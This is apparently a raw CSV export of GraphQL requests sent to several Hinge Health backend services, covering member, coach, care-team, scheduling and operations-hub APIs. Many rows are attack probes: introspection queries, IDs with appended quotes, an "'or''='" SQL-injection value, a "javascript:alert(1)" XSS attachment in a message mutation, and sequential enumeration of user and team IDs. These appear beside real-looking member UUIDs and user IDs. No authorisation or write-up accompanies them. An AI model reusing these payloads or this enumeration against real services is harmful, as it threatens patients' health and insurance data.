endpoint,method
https://my.hingehealth.io/graphql,"{""operationName"":""GetUser"",""variables"":{},""query"":""query"
https://coach-tools-bff.hingehealth.io/graphql,"{""operationName"":""getUserById"",""variables"":{""userId"":50166233},""query"":""query"
https://phoenix-bff.hingehealth.io/graphql,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query"
https://care-team-tools-bff.hingehealth.io/graphql,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query"
https://care-team-tools-bff.hingehealth.io/graphql,"{""query"":""query"
https://care-team-tools-bff.hingehealth.io/graphql,"{""operationName"":""findAllMemberAlerts"",""variables"":{""getMemberAlertInput"":{""userUuids"":[""e5970b6e-d6c9-4fb3-a49d-4b76a5ceb3ca""],""status"":[""Active"",""Upcoming""]}},""query"":""query"
https://care-team-tools-bff.hingehealth.io/graphql,"{""operationName"":""conversations"",""variables"":{""itemsPerPage"":25,""userIds"":[50166212],""adminUuid"":""dcc3630b-30d4-4315-b670-e99ae244ff9b"",""types"":[""TextConversation""],""page"":0},""query"":""query"
https://care-team-tools-bff.hingehealth.io/graphql,"{""operationName"":""conversations"",""variables"":{""itemsPerPage"":25,""userIds"":[50166212],""adminUuid"":""dcc3630b-30d4-4315-b670-e99ae244ff9b'"",""types"":[""TextConversation""],""page"":0},""query"":""query"
https://care-team-tools-bff.hingehealth.io/graphql,"{""operationName"":""createInAppMessage"",""variables"":{""createMessageDto"":{""conversationId"":""d3a394a04ff04bf0acaf5ab4de5997b0"",""message"":{""fromId"":""dcc3630b-30d4-4315-b670-e99ae244ff9b"",""attachments"":[{""asset_url"":""javascript:alert(1)"",""file_size"":291,""mime_type"":""text/html"",""title"":""5.html"",""type"":""file""}],""text"":""test"",""memberUuid"":""079db072-d59a-4975-8cc3-1b976342d440""}}},""query"":""mutation"
https://care-team-tools-bff.hingehealth.io/graphql,"{""operationName"":""getScheduledInAppMessages"",""variables"":{""listScheduledInAppMessagesInputDto"":{""conversationId"":""d3a394a04ff04bf0acaf5ab4de5997b0'""}},""query"":""query"
https://scheduling-bff.hingehealth.io/graphql,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query"
https://scheduling-bff.hingehealth.io/graphql,"{""operationName"":""User"",""variables"":{},""query"":""query"
https://scheduling-bff.hingehealth.io/graphql,"{""operationName"":""user"",""variables"":{},""query"":""query"
https://coach-tools-bff.hingehealth.io/graphql,"{""operationName"":""allConversations"",""variables"":{""adminUuid"":""dcc3630b-30d4-4315-b670-e99ae244ff9b""},""query"":""query"
https://coach-tools-bff.hingehealth.io/graphql,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query"
https://my.hingehealth.io/graphql,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query"
https://coach-tools-bff.hingehealth.io/api/graphql/coach_tools,"{""operationName"":""UserInfo"",""variables"":{""id"":""50166232""},""query"":""query"
https://coach-tools-bff.hingehealth.io/api/graphql/coach_tools,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query"
https://operations-hub-bff.hingehealth.io/graphql,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query"
https://operations-hub-bff.hingehealth.io/graphql,"{""operationName"":""getUserUuidById"",""variables"":{""id"":""23220685'""},""query"":""query"
https://operations-hub-bff.hingehealth.io/graphql,"{""operationName"":""getClientInsurersByClient"",""variables"":{""id"":""122""},""query"":""query"
https://operations-hub-bff.hingehealth.io/graphql,"{""operationName"":""getClientInsurersByClient"",""variables"":{""id"":""122'""},""query"":""query"
https://operations-hub-bff.hingehealth.io/graphql,"{""operationName"":""getClientInsurersByClient"",""variables"":{""id"":""'or''='""},""query"":""query"
https://operations-hub-bff.hingehealth.io/graphql,"{""operationName"":""getClientInsurerById"",""variables"":{""id"":""123'""},""query"":""query"
https://operations-hub-bff.hingehealth.io/graphql,"{""operationName"":""getDiscountUsage"",""variables"":{""clientId"":""3462'"",""discountDetailIds"":[59,70,83,545,546,547,69,103,113,294,295,296]},""query"":""query"
https://operations-hub-bff.hingehealth.io/graphql,"{""operationName"":""getDiscountUsage"",""variables"":{""clientId"":""3462'"",""discountDetailIds"":[""59'"",70,83,545,546,547,69,103,113,294,295,296]},""query"":""query"
https://operations-hub-bff.hingehealth.io/graphql,"{""operationName"":""getContractsByClientInsurer"",""variables"":{""id"":""6112'"",""includeVoided"":true},""query"":""query"
https://operations-hub-bff.hingehealth.io/graphql,"{""operationName"":""getContractTemplates"",""variables"":{},""query"":""query"
https://configurator-bff.hingehealth.io/graphql,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query"
https://coach-tools-bff.hingehealth.io/api/graphql/coach_tools,"{""operationName"":""UserInfo"",""variables"":{""id"":""50166233""},""query"":""query"
https://coach-tools-bff.hingehealth.io/api/graphql/coach_tools,"{""operationName"":""UserInfo"",""variables"":{""id"":""50166231""},""query"":""query"
https://coach-tools-bff.hingehealth.io/api/graphql/coach_tools,"{""operationName"":""UserInfo"",""variables"":{""id"":""50166211""},""query"":""query"
https://coach-tools-bff.hingehealth.io/api/graphql/coach_tools,"{""operationName"":""UserInfo"",""variables"":{""id"":""50166213""},""query"":""query"
https://coach-tools-bff.hingehealth.io/api/graphql/coach_tools,"{""operationName"":""Team"",""variables"":{""id"":""40485""},""query"":""query"
https://coach-tools-bff.hingehealth.io/api/graphql/coach_tools,"{""operationName"":""Team"",""variables"":{""id"":""40484""},""query"":""query"
https://coach-tools-bff.hingehealth.io/api/graphql/coach_tools,"{""operationName"":""Team"",""variables"":{""id"":""40483""},""query"":""query"
https://coach-tools-bff.hingehealth.io/api/graphql/coach_tools,"{""operationName"":""Team"",""variables"":{""id"":""40482""},""query"":""query"
https://coach-tools-bff.hingehealth.io/api/graphql/coach_tools,"{""operationName"":""Team"",""variables"":{""id"":""40481""},""query"":""query"
https://coach-tools-bff.hingehealth.io/api/graphql/coach_tools,"{""operationName"":""Team"",""variables"":{""id"":""40480""},""query"":""query"
https://my.hingehealth.io/graphql,POST
https://care-team-tools-bff.hingehealth.io/graphql,OPTIONS
https://care-team-tools-bff.hingehealth.io/graphql,POST
https://automation-bff.hingehealth.io/graphql,OPTIONS
https://automation-bff.hingehealth.io/graphql,POST
https://configurator-bff.hingehealth.io/graphql,OPTIONS
https://configurator-bff.hingehealth.io/graphql,POST
https://coach-tools-bff.hingehealth.io/graphql,OPTIONS
https://coach-tools-bff.hingehealth.io/graphql,POST
https://coach-tools-bff.hingehealth.io/api/graphql/coach_tools,OPTIONS
https://coach-tools-bff.hingehealth.io/api/graphql/coach_tools,POST
https://phoenix-bff.hingehealth.io/graphql,POST
https://phoenix-bff.hingehealth.io/basilisk/v1/graphql,POST
https://scheduling-bff.hingehealth.io/graphql,OPTIONS
https://scheduling-bff.hingehealth.io/graphql,POST
https://operations-hub-bff.hingehealth.io/graphql,OPTIONS
https://operations-hub-bff.hingehealth.io/graphql,POST
